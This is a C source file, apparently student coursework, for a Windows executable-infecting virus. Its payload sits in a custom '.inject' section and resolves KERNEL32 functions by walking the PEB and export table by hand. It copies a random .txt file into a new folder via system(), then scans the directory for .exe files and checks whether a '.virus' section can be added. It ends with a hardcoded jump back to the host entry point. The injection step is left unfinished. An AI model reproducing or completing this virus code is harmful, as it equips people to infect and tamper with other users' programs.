// https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table

#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <winternl.h>

// #define KERNEL32_DLL 3
// #define CURRENT_EXE 1

#define SET_SECT __attribute__((section(".inject")))

#define V_SECT_NAME ".virus"


#define CALL(function) goto function 
#define RET(function) goto function##_ret 

typedef struct _payload_info_t
{
    BYTE *payload;
    int size;
}payload_info_t;

// ==========
typedef HMODULE (*tLoadLibraryA)(LPCSTR);
typedef FARPROC (*tGetProcAddress)(HMODULE, LPCSTR);
typedef WINBOOL (*tFreeLibrary) (HMODULE);

// ==========
void payload(void) SET_SECT __attribute__((used));

void *get_image_base(wchar_t *module_name, LIST_ENTRY *list) SET_SECT;

IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base) SET_SECT;
void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, void *image_base) SET_SECT;

int compare(const char* a, const char* b) SET_SECT;
size_t length(const char* str) SET_SECT;
int wcompare(const wchar_t *a, const wchar_t *b) SET_SECT;
int match_suffix(char *str, char* suffix) SET_SECT;

#define FUNCTION(name) ((t_##name)pGetProcAddress(msvcrt_hModule, s_##name))
#define K32_FUNCTION(name) ((t##name)get_kernel_32_func(s##name, i_ex_dir, image_base))
#define LOAD(name) t##name p##name = (t##name)get_kernel_32_func(s##name, i_ex_dir, image_base)

int main()
{
    payload();
    return 0;
}

void payload(void)
{    
    // get_InMemoryOrderModuleList
    LIST_ENTRY *list = 0;
    {
        PEB *peb = 0; 
        asm volatile ("movq %%gs:0x60, %0":"=r" (peb));
        list = &(peb->Ldr->InMemoryOrderModuleList);
    }
    
    wchar_t kernel_32_name[] = L"KERNEL32.DLL";
    void *image_base = get_image_base(kernel_32_name, list);

    IMAGE_EXPORT_DIRECTORY *i_ex_dir = get_IMAGE_EXPORT_DIRECTORY(image_base);

    // load base funcs
    char sLoadLibraryA[] = "LoadLibraryA";
    char sGetProcAddress[] = "GetProcAddress";
    char sFreeLibrary[] = "FreeLibrary";

    LOAD(LoadLibraryA);
    LOAD(GetProcAddress);
    LOAD(FreeLibrary);

    // load msvcrt
    char s_msvcrt[] = "msvcrt.dll";
    HMODULE msvcrt_hModule = pLoadLibraryA(s_msvcrt);  // Load the C runtime library (msvcrt.dll)


// do sth.
typedef int (*t_puts)(const char *);
char s_puts[] = "puts";
typedef int (*t_printf) (const char *, ...);
char s_printf[] = "printf";

const char empty_str[] = ""; 

    // test
    {
        char msg[] = "_|Hallo|_\n";
        FUNCTION(puts)(msg);
    }

    typedef HANDLE (*tFindFirstFileA) (LPCSTR, LPWIN32_FIND_DATAA);
    typedef WINBOOL (*tFindNextFileA) (HANDLE, LPWIN32_FIND_DATAA);
    typedef WINBOOL (*tFindClose) (HANDLE);
    char sFindFirstFileA[] = "FindFirstFileA";
    char sFindNextFileA[] = "FindNextFileA";
    char sFindClose[] = "FindClose";

    CALL(task1);
    task1_ret: asm("nop");

    CALL(infect);
    infect_ret: asm("nop");

    //  calculating in-file offset of instruction mov /(rva)/, %%rax
    DWORD offset = 0;
    asm volatile(
        "leal payload, %%eax\n\t"
        "leal key_label, %%ebx\n\t"
        "subl %%eax, %%ebx\n\t"
        "movl %%ebx, %0\n\t"
        :"=r" (offset)
        :
        :"eax", "ebx"
    );

    offset += 3;
    // char format[] = "offset: %X\n"; 
    // FUNCTION(printf)(format, offset);

    pFreeLibrary(msvcrt_hModule);
// done

// go back to host code
    list = list->Flink;
    
    LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)((void*)list - 0x10);
    // void *current_image_base = *((void**)((void*)list + 0x20));
    void *current_image_base = entry->DllBase;

    asm volatile (
        // "xor %%rax, %%rax\n\t"
        "key_label: \n\t"
        "mov $0x000014E0, %%rax\n\t"
        // "mov $0x1234ABCD, %%rax\n\t"
        "add %[base_addr], %%rax\n\t"
        "jmp *%%rax"
        :
        :[base_addr] "r" (current_image_base)
        //  [entry_rva] "r" (i_nt_headers.OptionalHeader.AddressOfEntryPoint) 
        :"rax"
    );

    // ===========================================
    task1: {
        asm ("nop");
        typedef void (*t_srand)(unsigned int);
        typedef int (*t_rand)(void);
        typedef time_t (*t_time)(time_t *);
        char s_srand[] = "srand";
        char s_rand[] = "rand";
        char s_time[] = "time";

        typedef char *(*t_strcpy)(char *, const char *);
        char s_strcpy[] = "strcpy";

        typedef int(*t_system)(LPCSTR);
        typedef int(*t_sprintf)(char *, const char *,...);
        char s_system[] = "system";
        char s_sprintf[] = "sprintf";
        
        WIN32_FIND_DATA findFileData;
        char param[] = "*.*"; 
        HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);

        char suffix[] = ".txt";
        char txt_file_name[MAX_PATH];
        FUNCTION(srand)(FUNCTION(time)(NULL));
        do 
        {
            // FUNCTION(puts)(findFileData.cFileName);
            if (match_suffix(findFileData.cFileName, suffix))
            {
                FUNCTION(strcpy)(txt_file_name, findFileData.cFileName);
                if(FUNCTION(rand)()%2)
                {
                    break;
                } 
            }
        } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
        K32_FUNCTION(FindClose)(hFind);

        char mkdir_cmd[] = "mkdir v_folder";
        FUNCTION(system)(mkdir_cmd);

        char cpy_cmd[50];
        char cpy_fomat[] = "copy %s %s > NUL";
        char dest_path[] = ".\\v_folder\\2021302181087.txt";
        FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
        FUNCTION(system)(cpy_cmd);

        RET(task1);
    } // end of task1

    // ===========================================
    char *target = NULL; 
    payload_info_t payload_info = {0}; // parameters for inject

    infect: {
        asm ("nop");

        CALL(get_payload);
        get_payload_ret: asm("nop");

        WIN32_FIND_DATA findFileData;
        char param[] = "*.*"; 
        HANDLE hFind = K32_FUNCTION(FindFirstFileA)(param, &findFileData);

        char suffix[] = ".exe";
        do 
        {
            if (match_suffix(findFileData.cFileName, suffix))
            {
                target = findFileData.cFileName;
                CALL(inject);
                inject_ret: asm("nop");
            }
        } while (K32_FUNCTION(FindNextFileA)(hFind, &findFileData) != 0);
        K32_FUNCTION(FindClose)(hFind);
        RET(infect);
    } // end of infect

    // ===========================================
    inject:{
        asm ("nop");

        typedef FILE *(*t_fopen)(const char *,const char *);
        typedef size_t (*t_fread)(void *, size_t, size_t, FILE *);
        typedef size_t (*t_fwrite)(const void *, size_t, size_t, FILE *);
        typedef int (*t_fseek)(FILE *, long, int);
        typedef int (*t_fclose)(FILE *);
        char s_fopen[] = "fopen";
        char s_fread[] = "fread";
        char s_fwrite[] = "fwrite";
        char s_fseek[] = "fseek";
        char s_fclose[] = "fclose";

        char mode[] = "rb+";
        FUNCTION(puts)(target);
        FILE *host = FUNCTION(fopen)(target, mode);

        if(host == NULL) {
            FUNCTION(fclose)(host);
            RET(inject);
        }

        // get nt_header
        IMAGE_DOS_HEADER i_dos_header = {0};
        FUNCTION(fread)(&i_dos_header, 1, sizeof(i_dos_header), host);
        IMAGE_NT_HEADERS i_nt_headers = {0};
        FUNCTION(fseek)(host, i_dos_header.e_lfanew, SEEK_SET);
        FUNCTION(fread)(&i_nt_headers, 1, sizeof(i_nt_headers), host);

        // get raw data size and last header
        IMAGE_SECTION_HEADER i_sect_header = {0};
        int raw_data_size = 0;
        for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
        {
            FUNCTION(fread)(&i_sect_header, 1, sizeof(i_sect_header), host);
            raw_data_size += i_sect_header.SizeOfRawData;
        }

        // Preparing for adding new section header
        // the end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
        int position = i_dos_header.e_lfanew 
            + sizeof(IMAGE_NT_HEADERS) 
            + i_nt_headers.FileHeader.NumberOfSections
            *sizeof(IMAGE_SECTION_HEADER); 
        // spare space of IMAGE_SECTION_HEADER
        int space = i_nt_headers.OptionalHeader.FileAlignment 
            - position % i_nt_headers.OptionalHeader.FileAlignment;

// char msg[] = "test";
// FUNCTION(puts)(msg);

        char v_sect_name[] = V_SECT_NAME;
        int infectable = (compare(v_sect_name, i_sect_header.Name) != 0) 
            && (space >= sizeof(IMAGE_SECTION_HEADER)); 

        if(!infectable) {
            FUNCTION(fclose)(host);
            RET(inject);
        }

char format[] = "infectable: %d\n";
FUNCTION(printf)(format, infectable);
        // ((UNICODE_STRING*)(entry->Reserved4))->Buffer;

        // ADDING new section header: 
        int sect_start = position + space;  // start of original (host) codes
        int sect_end = sect_start + raw_data_size;  // end of original (host) codes

        // DWORD payload_raw_size = ((payload_info.size / i_nt_headers.OptionalHeader.FileAlignment)
        //     + !!(payload_info.size % i_nt_headers.OptionalHeader.FileAlignment))
        //     *i_nt_headers.OptionalHeader.FileAlignment;
        // DWORD PointerToRawData = sect_end;

        FUNCTION(fclose)(host);
        RET(inject);
    } // end of inject

    // ===========================================
    get_payload:{
        asm ("nop");

        // typedef FILE *(*t__wfopen)(const wchar_t *, const wchar_t *);
        // char s__wfopen[] = "_wfopen"; 

        // wchar_t *current_exe_name = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;
        // FILE* payload_file = FUNCTION(_wfopen)(current_exe_name, L"rb");

        // if(payload_file == NULL) {
        //     FUNCTION(fclose)(payload_file);
        //     RET(inject);
        // }
        // else
        // {
        //     char msg[] = "Y";
        //     FUNCTION(puts)(msg);
        // }
        
        // IMAGE_DOS_HEADER i_dos_header = {0};
        // fread(&i_dos_header, 1, sizeof(i_dos_header), payload_file);
        // fseek(payload_file, i_dos_header.e_lfanew, SEEK_SET);
        // IMAGE_NT_HEADERS i_nt_headers = {0};
        // fread(&i_nt_headers, 1, sizeof(i_nt_headers), payload_file);

        // IMAGE_SECTION_HEADER i_sect_header = {0};
        // for (int i = 0; i < i_nt_headers.FileHeader.NumberOfSections; i++)
        // {
        //     fread(&i_sect_header, 1, sizeof(i_sect_header), payload_file);
        //     if(strcmp(i_sect_header.Name, PAYLOAD_SECT_NAME) == 0)
        //     {
        //         break;
        //     }
        // }
        // fseek(payload_file, i_sect_header.PointerToRawData, SEEK_SET);
        // BYTE *payload = (BYTE*)malloc(i_sect_header.Misc.VirtualSize);
        // fread(payload, 1, i_sect_header.Misc.VirtualSize, payload_file);
        // payload_info_t payload_info = {payload, i_sect_header.Misc.VirtualSize};
        RET(get_payload);
    }
} // end of payload()

IMAGE_EXPORT_DIRECTORY *get_IMAGE_EXPORT_DIRECTORY(void *image_base)
{
    IMAGE_DOS_HEADER *i_dos_header = (IMAGE_DOS_HEADER *)image_base;

    IMAGE_NT_HEADERS *i_nt_headers = (IMAGE_NT_HEADERS *)(image_base + i_dos_header->e_lfanew);
    
    DWORD EX_RVA = i_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    IMAGE_EXPORT_DIRECTORY* EX_VA = (IMAGE_EXPORT_DIRECTORY *)(image_base + EX_RVA);
    return EX_VA;
}

void *get_kernel_32_func(char *function_name, IMAGE_EXPORT_DIRECTORY* i_ex_dir, void *image_base)
{
    DWORD *name_table = (DWORD*)(i_ex_dir->AddressOfNames + image_base);

    int serial = 0;
    for (; serial < i_ex_dir->NumberOfFunctions; serial++)
    {
        // puts((char*)(name_table[serial]+image_base));
        if(compare((char*)(name_table[serial]+image_base), function_name) == 0)
        {
            // printf("%s GOT\n", function_name);
            // printf("req: %s \n", (char*)(name_table[serial]+image_base));
            break;
        }
    }

    WORD *ordinal = (WORD*)(i_ex_dir->AddressOfNameOrdinals + image_base);
    DWORD *func_rvas = (DWORD*)(i_ex_dir->AddressOfFunctions + image_base);

    return (void*)(func_rvas[ordinal[serial]] + image_base);
}

void *get_image_base(wchar_t *module_name, LIST_ENTRY *list)
{
    for (int i = 0; i < 10; i++)
    {
        LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)((void*)list - 0x10);

        wchar_t *buffer = ((UNICODE_STRING*)(entry->Reserved4))->Buffer;  

        if (buffer != NULL && wcompare(module_name, buffer) == 0)
        {
            // printf("%d: ,DllBase: %X\n", i, entry->DllBase);
            // wprintf(L"%ls\n", ((UNICODE_STRING*)(entry->Reserved4))->Buffer);
            return entry->DllBase;
        }
        list = list->Flink;
    }
}

#include "string.c"
